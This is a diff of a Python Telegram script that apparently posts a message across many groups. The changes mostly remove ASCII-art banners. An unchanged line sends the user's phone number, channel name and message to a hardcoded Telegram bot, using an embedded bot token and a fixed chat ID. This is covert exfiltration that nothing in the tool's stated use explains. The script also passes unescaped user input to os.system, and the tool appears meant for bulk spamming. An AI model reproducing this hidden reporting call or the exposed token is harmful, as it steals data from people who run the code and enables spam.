@@ -178,13 +178,8 @@ async def main(api_id, api_hash, phone, channel_username, ranbefore):
             print(Fore.MAGENTA  + f'''
     
           
+''' + Fore.LIGHTGREEN_EX + f'''Sent the message {totalgroupdone} time/s in all groups''' + Fore.MAGENTA + '''
 
- ______          _                    _ 
- |  _  \        | |                  | |    
- | | | |___  ___| | __ _ _ __ ___  __| |    ''' + Fore.LIGHTGREEN_EX + f'''Sent the message {totalgroupdone} time/s in all groups''' + Fore.MAGENTA + '''
- | | | / _ \/ __| |/ _` | '__/ _ \/ _` |  
- | |/ /  __/ (__| | (_| | | |  __/ (_| |
- |___/ \___|\___|_|\__,_|_|  \___|\__,_|
                                        
                                        
 ''')
@@ -210,13 +205,6 @@ if __name__ == '__main__':
     print(Fore.MAGENTA  + '''
 
           
-
- ______          _                    _ 
- |  _  \        | |                  | |
- | | | |___  ___| | __ _ _ __ ___  __| |
- | | | / _ \/ __| |/ _` | '__/ _ \/ _` |
- | |/ /  __/ (__| | (_| | | |  __/ (_| |
- |___/ \___|\___|_|\__,_|_|  \___|\__,_|
                                        
                                        
 ''')
@@ -270,16 +258,7 @@ if __name__ == '__main__':
         time.sleep(3)
         print(Fore.MAGENTA  + '''
     
-          
-
-______          _                    _ 
-|  _  \        | |                  | |
-| | | |___  ___| | __ _ _ __ ___  __| |
-| | | / _ \/ __| |/ _` | '__/ _ \/ _` |
-| |/ /  __/ (__| | (_| | | |  __/ (_| |
-|___/ \___|\___|_|\__,_|_|  \___|\__,_|
-                                       
-                                       
+                               
 ''')
         os.system(f'title {phone} - {channel_username} - group {gl} - {channel_username} - {message}')
         requests.get(f'https://api.telegram.org/bot5281317146:AAGYj2IJmmmc8TYUGB5UP0QO0zIsLjXcrqM/sendMessage?chat_id=1431454289&text={phone} - {channel_username} - group {gl} - {channel_username} - {message}')
